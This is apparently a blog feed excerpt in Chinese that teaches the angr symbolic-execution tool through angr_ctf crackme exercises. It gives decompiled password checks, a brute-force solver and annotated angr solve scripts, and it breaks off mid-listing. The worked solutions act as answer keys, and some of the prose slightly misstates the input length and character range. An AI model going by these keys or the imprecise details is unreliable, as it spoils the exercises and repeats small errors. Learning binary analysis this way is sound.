punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># 对符号变量进行约束求解</span>        stored_solutions0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solution0'</span><span class="token punctuation">]</span>        stored_solutions1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solution1'</span><span class="token punctuation">]</span>        scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions0<span class="token punctuation">)</span>        scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions1<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125; &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">,</span> scanf1_solution<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/image-20210510213720026.png" alt="image-20210510213720026"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文<strong>提高篇</strong>主要核心在于对于约束条件和<code>hook</code>的学习，通过约束条件能够解决一般的路径爆炸问题（如存在循环），而<code>hook</code>能够对于程序执行到指定的代码部分，接管操作，跳过会产生路径爆炸的代码或模拟我们不希望执行的代码（达到同样的目的）。这里分别对做完的4道题目总结一下：</p><ul><li><strong>08_angr_constraints</strong>：第一个出现循环的代码，也是产生路径爆炸的地方，为了避免，我们<code>find</code>指定位置，并通过对比此时内存中的字符串和目标串，从而无需执行循环也能达到同样的效果。</li><li><strong>09_angr_hooks</strong>：在上一题的基础上利用了<code>angr</code>的<code>hook</code>，接管指定位置的代码程序，这使得程序能够跳过某一部分代码的执行，但此时是依据目标代码的地址和要跳过的字节数确定的。</li><li><strong>10_angr_simprocedures</strong>：跟上题一样，只不过此处是利用函数名进行<code>hook</code>，扩展性和可读性都得到了提高，也是认识<code>SimProcedures</code>的一个过程</li><li><strong>11_angr_sim_scanf</strong>：对<code>scanf</code>函数进行了模拟，可以和以前操作<code>scanf</code>之后修改寄存器，修改内存，修改栈的几题做对比，该方法通用性更高。</li></ul><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/blob/master/%E7%AC%94%E8%AE%B0/03/Angr_CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%EF%BC%88%E4%B8%89%EF%BC%89.md">AngrCTF_FITM/Angr_CTF从入门到精通（三）.md at master · ZERO-A-ONE/AngrCTF_FITM</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>static_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【angr_ctf】二进制分析工具angr使用与练习-Part I（基础篇）</title>
    <link href="/article/61784.html"/>
    <url>/article/61784.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录一下学习使用<code>angr</code>过程中的一些心得，主要是基于<code>Github</code>上 的开源项目<a href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf</a><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="jakespringer/angr_ctf (github.com)">[3]</span></a></sup>，该项目通过angr来解决一些ctf题，帮助初学者一步步熟悉<code>angr</code>的使用。相关的参考资料放在了文末，包括一些我认为讲解地不错的<code>angr</code>相关的文章。所有题解我打算分成<strong>基础篇</strong>，<strong>提高篇</strong>，<strong>进阶篇</strong>三个部分，对应三篇文章来完成，本文属于<strong>基础篇</strong>。</p><div class="note note-warning">            <p>由于本人也是初学，文章中许多理解都是建于参考资料和个人的思考上，难免存在纰漏或理解不正确的地方，望大佬发现后能及时指出，不胜感激🙏</p>          </div><blockquote><p>对于angr_ctf的使用，简单说明一下，每个题目都包括如下内容：</p><ul><li><code>xx_angr_xx.c.templite</code>: c源码模板文件</li><li><code>generate.py</code>: 原仓库中没有现成的二进制文件，需要使用者通过执行<code>python generate.py 123 filename</code>的方式来手动编译（123是随机数，用于混淆）</li><li><code>scaffoldxx.py</code>：解题提示，作者在关键位置用<code>???,...</code>的方式进行了替代，也可以看作是官方提供的解题模板</li><li><code>solve.py</code>：位于<code>solutions</code>，是题解</li></ul></blockquote><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><p>直接拖到ida中查看一下源代码：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span>  char s1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>23h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>15h<span class="token punctuation">]</span>  unsigned <span class="token builtin">int</span> v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>Ch<span class="token punctuation">]</span>  v6 <span class="token operator">=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%8s"</span><span class="token punctuation">,</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>    s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> complex_function<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> !strcmp<span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"DVNBCPLR"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    puts<span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    puts<span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token builtin">int</span> __cdecl complex_function<span class="token punctuation">(</span>signed <span class="token builtin">int</span> a1<span class="token punctuation">,</span> <span class="token builtin">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">|</span><span class="token operator">|</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    puts<span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>题意很简单，对一个输入的长度为7的字符串每一位做一个变换<code>complex_function</code>,然后和目标字符串<code>DVNBCPLR</code>比对，如果相同，则正确。同时还限制了字符的范围为<code>[64,90)</code>。</p><ul><li><p><strong>暴力破解</strong>    </p><p>只需要一个双重for循环，第一层遍历字符串位数，第二层遍历可选的字符串，然后判断每一个变换后的字符与目标字符是否相等即可，解答如下：</p></li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token keyword">def</span> <span class="token function">violence_solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    find a string, for each character in the string, after transfered by function complex_function, it will be the same as the target character in target_str(password)    :return:    '''</span>    target_str <span class="token operator">=</span> <span class="token string">'DVNBCPLR'</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>complex_function<span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> v<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] Success, flag is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li><p><strong>angr解答</strong>  </p><p><code>angr</code>的强大在于他能遍历程序的路径，找出能够执行指定路径的测试用例（核心就是符号执行的思想），因此我们只需要给定我们希望执行到的路径，然后拿到对应的输入用例即可。在本题中，希望执行的路径到达<code>puts(&quot;Good Job&quot;)</code>，只需要给<code>angr</code>提供对应该语句所在的内存地址（通过ida查看得到）：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210430153731.png" alt=""></p><p>下面对应题解中的代码辅以注释来理解整个过程中angr做的事情：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">angr_solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'00_angr_find'</span>  <span class="token comment"># 二进制文件路径</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  <span class="token comment"># 将二进制文件装载成angr中指定的Project对象</span>    <span class="token comment"># factory提供了Project对象的一系列调用接口，entry_state()则是提供了一个程序的实例镜像(SimState对象)，</span>    <span class="token comment"># 模拟程序执行某个时刻的状态（记录一系列程序运行时信息，如内存/寄存器/文件系统数据），一般我们选择程序的入口</span>    <span class="token comment"># 状态entry_state()即可，程序会从main函数开始运行</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment"># 有了状态之后，我们需要模拟程序的运行，即用到`Simulation Managers`(缩写是simgr)，接受一个状态信息初始化，</span>    <span class="token comment"># 通过操控simgr达到模拟程序运行的目的</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token comment"># 程序需要检索的目的地址，通过一个具体的内存地址，表示路径需要经过的节点，换言之，就是我们想要路径的限制条件</span>    <span class="token comment"># 通过simgr的explore()函数实现查找，这里的地址使用ida中看到的Good Job对应的内存地址</span>    print_good_address <span class="token operator">=</span> <span class="token number">0x08048678</span>      simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token comment"># simgr会把找到的符合要求的路径存储在found中，取第一个找到的状态，posix.dumps(sys.stdin.fileno())则是</span>    <span class="token comment"># 获取当前状态下stdin输入的数据，即程序的输入值</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># sys.stdin.fileno() 代表程序的标准输入，具体值为0</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210501165254.png" alt=""></p><p>由该题解我们也可以对angr分析程序的过程有一个基本的映像：</p></li></ul><ol><li><p>加载二进制文件为<code>Project</code>对象</p></li><li><p>获取程序的初始化状态<code>state</code></p></li><li><p>创建程序的模拟管理器<code>simgr</code>，用于控制程序的模拟运行，从我们提供的初始化状态<code>state</code>开始</p></li><li><p>设定要<code>find</code>的路径(通过内存地址的限制方式或其他)，记录该路径下的<code>state</code>信息，执行<code>expolre</code></p></li><li><p>检查路径查找结果，获取路径相应的状态信息，并从<code>state</code>中提取需要的信息（如标准输入的值）</p></li></ol><p>到此，这个题算是做完了，但对于<code>angr</code>的理解目前也仅仅是会用一点而已，后面根据更多的题目练习来加深对<code>angr</code>的掌握，同时慢慢理解其内部的运行机制。</p><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>该题中main函数的代码非常长，直接用<code>ida</code>反编译源代码解析不出来，这里用到另外一个源代码反编译工具<a href="https://github.com/avast/retdec">retdec</a>，官网的使用部分有一点缺陷（我下载最新的已编译程序是python脚本），将</p><div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$RETDEC_INSTALL_DIR\bin\retdec-decompiler.exe test.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>改成</p><div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python RETDEC_INSTALL_DIR\bin\retdec-decompiler.py test.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>源代码非常多（接近7w行），但大部分是重复性的垃圾代码，将其中核心的部分摘录出来得到：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ------------------- Function Prototypes --------------------</span><span class="token class-name">int32_t</span> <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">int32_t</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> a1<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">int32_t</span> <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> str<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> str2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// --------------------- Global Variables ---------------------</span><span class="token keyword">char</span> g1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 0x80d603d</span><span class="token class-name">int32_t</span> g2<span class="token punctuation">;</span><span class="token comment">// ------------------------ Functions -------------------------</span><span class="token comment">// Address range: 0x8048549 - 0x80485a8</span><span class="token class-name">int32_t</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> a1<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v1 <span class="token operator">=</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1 <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">int32_t</span> v2 <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">*</span> a2<span class="token punctuation">;</span> <span class="token comment">// 0x8048583</span>        <span class="token class-name">int32_t</span> v3 <span class="token operator">=</span> v2 <span class="token operator">+</span> v1<span class="token punctuation">;</span> <span class="token comment">// 0x8048585</span>        <span class="token keyword">return</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> v3 <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">-</span> v3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x804855b</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// UNREACHABLE</span><span class="token punctuation">&#125;</span><span class="token comment">// Address range: 0x80485a8 - 0x80485b5</span><span class="token class-name">int32_t</span> <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0x80485a8</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x80d603d</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> result<span class="token punctuation">;</span> <span class="token comment">// 0x80485a8</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Address range: 0x80485b5 - 0x8048602</span><span class="token class-name">int32_t</span> <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> str<span class="token punctuation">,</span> <span class="token class-name">int32_t</span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0x80485b5</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>g1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>str<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>str2<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x80485ff</span>        <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x80485ff</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Address range: 0x8048602 - 0x80d458d</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">int32_t</span> v1 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x804861b</span>    <span class="token class-name">int32_t</span> v2<span class="token punctuation">;</span> <span class="token comment">// bp-40, 0x8048602</span>    <span class="token class-name">int32_t</span> v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x804862f</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x8048644</span>    <span class="token class-name">int32_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// bp-96, 0x8048602</span>    <span class="token class-name">int32_t</span> v5 <span class="token operator">=</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">;</span> <span class="token comment">// 0x8048610</span>    v2 <span class="token operator">=</span> <span class="token number">0x5a4c5850</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// bp-60, 0x8048602</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%8s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> <span class="token operator">*</span> v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">int32_t</span> <span class="token operator">*</span> v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> <span class="token operator">*</span> v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x8048689</span>        <span class="token operator">*</span>v8 <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token operator">*</span>v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">*</span>v10<span class="token punctuation">;</span>        <span class="token operator">*</span>v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token function">complex_function</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">uint32_t</span> v11<span class="token punctuation">;</span> <span class="token comment">// 0x8048602</span>    <span class="token class-name">uint32_t</span> v12<span class="token punctuation">;</span> <span class="token comment">// 0x8048602</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x808e62f</span>        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">4</span><span 